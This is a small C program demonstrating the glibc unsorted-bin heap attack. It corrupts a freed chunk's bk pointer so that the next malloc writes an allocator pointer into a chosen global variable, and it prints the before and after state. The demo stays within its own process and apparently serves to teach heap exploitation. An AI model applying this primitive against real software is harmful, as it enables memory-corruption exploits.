#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>

unsigned long remissions;

int main()
{
	printf("remissions @ %p = %#lx\n",&remissions,remissions);
	unsigned long *p0,*p1;
	p0=malloc(0x777);
	p1=malloc(0x10);
	printf("p0 @ %p\n",p0);
	free(p0);
	printf("p0 fwd pointer = %p\n",*(p0));
	printf("p0 bk pointer = %p\n",*(p0+1));
	//pointer will get written to bk+0x10 when chunk leaves unsorted bin
	*(p0+1)=((unsigned long)&remissions)-0x10;
	printf("p0 fwd pointer = %p\n",*(p0));
	printf("p0 bk pointer = %p\n",*(p0+1));
	malloc(0x777);
	printf("remissions @ %p = %#lx\n",&remissions,remissions);
	
}
